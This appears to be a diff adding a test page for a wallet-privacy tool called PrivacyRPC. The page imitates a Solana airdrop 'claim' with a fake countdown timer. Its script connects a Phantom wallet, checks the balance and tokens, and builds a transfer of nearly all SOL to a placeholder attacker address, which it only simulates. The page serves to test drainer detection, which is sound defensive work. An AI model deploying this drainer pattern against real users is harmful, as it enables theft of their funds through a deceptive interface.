@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Solana Rewards - Claim Your SOL</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      color: #fff;
+      min-height: 100vh;
+      padding: 40px;
+    }
+    .container { max-width: 500px; margin: 0 auto; }
+    .logo { font-size: 28px; font-weight: bold; margin-bottom: 40px; color: #9945FF; }
+    .card {
+      background: rgba(255,255,255,0.05);
+      border-radius: 20px;
+      padding: 30px;
+      margin-bottom: 20px;
+    }
+    .reward-box {
+      background: linear-gradient(135deg, #9945FF22 0%, #14F19522 100%);
+      border: 1px solid #9945FF;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .reward-amount {
+      font-size: 48px;
+      font-weight: bold;
+      background: linear-gradient(90deg, #9945FF, #14F195);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .btn {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
+      border: none;
+      border-radius: 12px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .btn:hover { opacity: 0.9; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .status {
+      margin-top: 20px;
+      padding: 16px;
+      background: rgba(255,0,0,0.1);
+      border: 1px solid #ff4757;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 12px;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .test-info {
+      background: rgba(255,184,0,0.1);
+      border: 1px solid #FFB800;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+    .test-info h4 { color: #FFB800; margin-bottom: 8px; }
+    .timer { color: #FF4757; font-weight: bold; }
+  </style>
+  <!-- Buffer polyfill required for Solana web3.js -->
+  <script src="https://bundle.run/buffer@6.0.3"></script>
+  <script>window.Buffer = window.Buffer || buffer.Buffer;</script>
+  <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Solana Rewards</div>
+
+    <div class="test-info">
+      <h4>TEST: Claim That Drains</h4>
+      <p>Classic scam: "Claim your airdrop" button actually drains your wallet. The transaction LOOKS like a claim but actually transfers OUT. Tests if PrivacyRPC detects mismatch between UI promise and actual transaction direction.</p>
+    </div>
+
+    <div class="card">
+      <div class="reward-box">
+        <p style="margin-bottom: 8px; color: #888;">Your unclaimed rewards</p>
+        <div class="reward-amount">2.5 SOL</div>
+        <p style="margin-top: 8px; color: #14F195;">Claim expires in <span class="timer">4:59</span></p>
+      </div>
+
+      <button class="btn" id="claimBtn" onclick="runClaimDrainTest()">Claim 2.5 SOL Now</button>
+    </div>
+
+    <div class="status" id="status" style="display: none;"></div>
+  </div>
+
+  <script>
+    const RPC_URL = 'https://api.devnet.solana.com';
+    const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
+    const pageLoadTime = Date.now();
+    let wallet = null;
+
+    // Fake countdown timer
+    let seconds = 299;
+    setInterval(() => {
+      if (seconds > 0) seconds--;
+      const mins = Math.floor(seconds / 60);
+      const secs = seconds % 60;
+      document.querySelector('.timer').textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+    }, 1000);
+
+    function log(msg) {
+      const status = document.getElementById('status');
+      status.style.display = 'block';
+      const elapsed = Date.now() - pageLoadTime;
+      status.innerHTML += `[+${elapsed}ms] ${msg}<br>`;
+      status.scrollTop = status.scrollHeight;
+    }
+
+    async function runClaimDrainTest() {
+      const btn = document.getElementById('claimBtn');
+
+      if (!window.solana || !window.solana.isPhantom) {
+        alert('Please install Phantom wallet extension');
+        return;
+      }
+
+      try {
+        btn.disabled = true;
+        btn.textContent = 'Processing Claim...';
+
+        log('Connecting wallet...');
+        const resp = await window.solana.connect();
+        wallet = resp.publicKey;
+
+        log('');
+        log('=== CLAIM THAT DRAINS PATTERN ===');
+        log('User expects: RECEIVE 2.5 SOL');
+        log('Actual TX: SEND all SOL to attacker');
+        log('');
+
+        // Step 1: Check balance (find out how much to steal)
+        log('-> getBalance (checking how much to steal)');
+        const balance = await connection.getBalance(wallet);
+        log(`   Found: ${balance / 1e9} SOL`);
+
+        // Step 2: Get tokens too
+        log('-> getTokenAccountsByOwner (checking tokens)');
+        await connection.getTokenAccountsByOwner(wallet, {
+          programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
+        });
+
+        // Step 3: Prepare drain transaction
+        log('-> getLatestBlockhash');
+        const { blockhash } = await connection.getLatestBlockhash();
+
+        // Step 4: Create the DRAIN transaction (disguised as claim)
+        log('');
+        log('Creating DRAIN transaction...');
+        log('(UI says "claim" but TX sends funds OUT)');
+
+        const ATTACKER_WALLET = new solanaWeb3.PublicKey('AttackerWa11etXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'.slice(0, 44));
+
+        const tx = new solanaWeb3.Transaction();
+        tx.recentBlockhash = blockhash;
+        tx.feePayer = wallet;
+
+        // This would be the drain instruction
+        tx.add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: wallet,
+            toPubkey: ATTACKER_WALLET,
+            lamports: Math.max(0, balance - 5000) // Leave dust for rent
+          })
+        );
+
+        log('-> simulateTransaction (testing drain)');
+        try {
+          await connection.simulateTransaction(tx);
+        } catch (e) {}
+
+        log('-> sendTransaction (would trigger wallet popup)');
+        // In real drainer, this requests signature
+        // We don't actually send for testing safety
+
+        log('');
+        log('=== PATTERN COMPLETE ===');
+        log('');
+        log('PrivacyRPC should detect:');
+        log('- Quick enumeration + TX pattern');
+        log('- Transaction direction mismatch');
+        log('- (Future: UI promise vs TX reality)');
+
+        btn.textContent = 'Test Complete';
+        btn.disabled = false;
+
+      } catch (e) {
+        log('ERROR: ' + e.message);
+        btn.textContent = 'Claim 2.5 SOL Now';
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
